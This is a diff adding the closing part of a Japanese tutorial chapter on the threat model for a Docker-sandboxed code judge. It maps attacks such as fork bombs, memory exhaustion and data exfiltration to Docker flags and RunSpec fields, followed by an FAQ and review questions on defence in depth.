+	StdoutLimit <span class="ty">int64</span>         <span class="cm">// stdout の上限（ジャッジ側 OOM 防止, NF-06）</span>
+}</code></pre>
+
+    <p>そして、<strong>この章の脅威 → 防御 → <code>RunSpec</code></strong> を1枚に畳んだのが次の対応表です。これが第03章の結論であり、第04〜05章の設計要件そのものです。左から右へ「攻撃者が何を狙い、どの壁で止め、コードのどこに現れるか」を追えるようにしてあります。</p>
+    <table>
+      <tr><th>脅威（攻撃者の狙い）</th><th>Docker の防御</th><th>RunSpec フィールド</th><th>要件</th></tr>
+      <tr><td>外部へ情報流出・踏み台・内部探索</td><td><code>--network none</code></td><td>（Run 内で常時付与）</td><td>NF-02</td></tr>
+      <tr><td>ホストのファイルを書き換え・削除</td><td><code>--read-only</code></td><td><code>ReadOnly bool</code></td><td>NF-03</td></tr>
+      <tr><td>fork 爆弾でプロセス増殖</td><td><code>--pids-limit</code></td><td><code>PidsLimit int</code></td><td>NF-06</td></tr>
+      <tr><td>メモリ食い潰し</td><td><code>--memory</code></td><td><code>MemoryMB int</code></td><td>NF-05</td></tr>
+      <tr><td>無限ループで居座る</td><td>壁時計タイムアウト</td><td><code>WallTimeout time.Duration</code></td><td>NF-04</td></tr>
+      <tr><td>出力を無限に吐きジャッジを枯渇</td><td>読み取りバッファ上限</td><td><code>StdoutLimit int64</code></td><td>NF-06</td></tr>
+    </table>
+    <p>1点だけ補足します。<strong>ネットワーク遮断だけは <code>RunSpec</code> のフィールドになっていません</strong>。理由は明快で、標準入出力ジャッジに<strong>ネットワークを開ける正当な場面が一つもない</strong>から。可変にする（＝ときには開ける）余地を残すこと自体がリスクなので、本書の <code>sandbox.go</code> は <code>--network none</code> を <code>Run</code> の中で<strong>無条件・常時</strong>付与します。「切り替えられない安全」は「切り替えられる安全」より堅い——設定にしないことが、そのまま防御になっている好例です。他の壁（read-only やメモリ上限）が問題ごとに調整の余地を持つのと対照的に、ネットワークだけは<strong>選択肢を与えない</strong>。この非対称も、脅威モデルから導かれた設計判断です。</p>
+
+    <div class="box do"><div class="box-k">▸ 手を動かす代わりに — 脅威を1つ選んで「壁を1枚外す」思考実験</div>
+      <p>この章にコードの確認はありません。代わりに、頭の中で<strong>攻撃者になってみてください</strong>。上の対応表から防御を1つ選び、「もしこれだけ無かったら、自分ならどう攻撃するか」を<strong>具体的な提出コードとして</strong>思い描く。例えば「read-only を外したら、次に実行される提出物をどう書き換えて乗っ取るか?」「pids-limit を外したら、fork 爆弾は何秒でホストを窒息させるか?」。5つの壁それぞれについてこの思考実験をやると、<strong>各壁が守っている資産</strong>が体で分かり、第04章で <code>docker run</code> の長いフラグ列を書くとき、一つひとつが「どの攻撃への回答か」を指させるようになります。防御は、それが防ぐ攻撃の絵とセットで初めて記憶に残ります。</p>
+    </div>
+
+    <h2>つまずき FAQ</h2>
+    <details class="qa"><summary>自分専用（単一ユーザー）のジャッジなのに、なぜここまで厳重に隔離するの?</summary>
+      <div class="qa-body"><p>3つの理由があります。第一に、<strong>敵対コードは「他人」だけが書くものではない</strong>——練習中に自分が無限ループや巨大配列をうっかり書くのは日常で、これらは意図せずホストを巻き添えにします。資源上限は「悪意対策」であると同時に「自分のバグからジャッジを守る安全装置」です。第二に、要件 C-05 が「将来の複数ユーザー化を阻害しない」設計を求めており、隔離を後付けにすると土台からの作り直しになります。第三に、本書の<strong>目的そのものが「信頼できないコードを安全に実行する基盤を理解すること」</strong>（要件 2.1）。隔離は誰のためでもなく、ジャッジという道具の本質です。だから単一ユーザーでも、檻は最初から掛けます。</p></div>
+    </details>
+    <details class="qa"><summary>ネットワークだけ、なぜ「ときには開ける」余地を残さないの?</summary>
+      <div class="qa-body"><p>標準入出力形式のジャッジ（本書のMVP）に、<strong>提出コードがネットワークを使う正当な用途が一つもない</strong>からです。用途がないのに開ける余地を残すと、その可変性自体が攻撃面になります。しかもネットワークは「特定ドメインだけ許可」のような中途半端な絞り込みが、DNS 経由の持ち出しや許可先へのリダイレクトでほぼ必ず抜けます。だから本書は <code>--network none</code> を <code>Run</code> の中で無条件に付与し、<strong>切り替え不能の全遮断</strong>にします。read-only やメモリ上限が問題ごとに調整の余地を持つのと違い、ネットワークだけは選択肢を与えない——これも脅威モデルから導いた設計判断です。</p></div>
+    </details>
+    <details class="qa"><summary>防御を全部同時に掛ける必要は本当にある? どれか強力な1枚で足りないの?</summary>
+      <div class="qa-body"><p>足りません。各防御は<strong>それぞれ別の資産</strong>を守っているからです。ネットワークを断っても read-only を忘れれば、書き換えでジャッジを乗っ取られる。read-only にしてもネットワークを開けたままなら、読めた情報を外へ送られる。メモリを絞っても pids-limit がなければ fork 爆弾でホストが窒息する。「1つでも欠けると、そこだけが穴になって全体が破られる」——これが多層防御（defense in depth）の本質で、鎖の強さは最も弱い環で決まります。第04〜05章で Docker のフラグを、ひとつも省かず全部積むのはこのためです。</p></div>
+    </details>
+
+    <h2>理解度チェック</h2>
+    <p>次の問いに<strong>自分の言葉で</strong>答えられたら、この章は卒業です。</p>
+    <details class="qa"><summary>1. 「提出コードは敵対的である」（NF-01）とはどういう意味か。なぜ「たぶん大丈夫」で走らせてはいけないか。</summary>
+      <div class="qa-body"><p>提出コードを、実際に攻撃かどうかに関わらず<strong>「私を攻撃してくるコードだ」と最初から決めてかかる</strong>という前提。攻撃かどうかは問題ではなく、<strong>攻撃できてしまう環境で走らせること自体が事故</strong>だから。しかも攻撃は高度な技巧を要さず、<code>os.ReadFile</code> や <code>os.RemoveAll</code> といったごく普通の標準API を素直に呼ぶだけで成立する。「たぶん大丈夫」は入口を開けたままにすることを意味し、善意の提出者のうっかりバグ（無限ループ・巨大配列）ですらホストを巻き添えにする。だから前提を敵対的に固定し、入口を全部塞ぐ。</p></div>
+    </details>
+    <details class="qa"><summary>2. 5つの脅威（ファイル / ネットワーク / プロセス数 / メモリ / 時間）と、それぞれの防御・RunSpec フィールドを対応づけよ。</summary>
+      <div class="qa-body"><p><strong>ファイル書き換え・削除</strong> → read-only FS（<code>--read-only</code> / <code>ReadOnly bool</code>, NF-03）。<strong>ネットワーク経由の流出・踏み台</strong> → 全遮断（<code>--network none</code>, Run 内で常時付与, NF-02）。<strong>fork 爆弾（プロセス増殖）</strong> → プロセス数上限（<code>--pids-limit</code> / <code>PidsLimit int</code>, NF-06）。<strong>メモリ食い潰し</strong> → メモリ上限（<code>--memory</code> / <code>MemoryMB int</code>, NF-05）。<strong>無限ループ（居座り）</strong> → 時間上限（壁時計 / <code>WallTimeout time.Duration</code>, NF-04）。加えて出力の無限吐きには stdout 上限（<code>StdoutLimit int64</code>, NF-06）。各防御は別々の資産を守るので、全部同時に必要。</p></div>
+    </details>
+    <details class="qa"><summary>3. 「多層防御」とは何か。1枚の壁で足りない理由を、具体例で説明せよ。</summary>
+      <div class="qa-body"><p>性質の異なる防御を<strong>何枚も重ねて</strong>掛ける考え方（defense in depth）。各防御が別の資産を守るため、1枚でも欠けるとそこが穴になり全体が破られる。例: ネットワークを断っても read-only を忘れれば、コンテナ内で次の提出物を書き換えて永続的に乗っ取れる。逆に read-only にしてもネットワークを開ければ、読めた情報を外部へ送信できる。メモリを絞っても pids-limit がなければ fork 爆弾でホストが窒息し、全提出が止まる。鎖の強さは最も弱い環で決まる——だから Docker のフラグはひとつも省かず全部積む。</p></div>
+    </details>
+
+    <h2>まとめ — 次の層へ</h2>
+    <p>この章では1行もプロダクションコードを書きませんでしたが、本書で<strong>最も重要な前提</strong>を腹に落としました。<strong>提出コードは敵対的である</strong>（NF-01）。この一文から出発し、攻撃者が狙う3つの資産——ファイル・ネットワーク・計算資源——を洗い出し、それぞれに具体的な攻撃シナリオ（ファイル破壊・情報流出・踏み台・fork 爆弾・メモリ食い潰し・無限ループ）を描き、対応する防御（read-only・ネットワーク遮断・pids/メモリ/時間の各上限）を割り当てました。そして「1枚でも欠けると破られる」多層防御の原則を立て、それらの防御を次章で作る <code>RunSpec</code> の各フィールドに結びつけました。</p>
+    <p>ここまでは<strong>「何を防ぐか（要件）」</strong>の話でした。次の第04章から、いよいよ<strong>「どう防ぐか（実装）」</strong>に入ります。この章で作った対応表を仕様書として、<code>docker run</code> の長いフラグ列を1つずつ組み立て、提出コードを本物のコンテナに閉じ込めます。<code>--network none</code>・<code>--read-only</code>・<code>--pids-limit</code>——この章で「どの攻撃への回答か」を指させるようになったフラグたちが、<code>internal/judge/sandbox.go</code> の <code>DockerSandbox</code> として姿を現します。脅威の絵は、もうあなたの手の中にあります。あとは、その一つひとつに檻を掛けるだけです。</p>
+
+    <div class="chap-foot">
+      <a class="pager" href="02-verdict.html"><span class="dir">← 前へ</span>第02章 · verdict — 判定の種類</a>
+      <a class="pager next" href="04-sandbox.html"><span class="dir">次へ →</span>第04章 · コンテナに閉じ込める</a>
+    </div>
+  </main>
+</div>
+</body>
+</html>
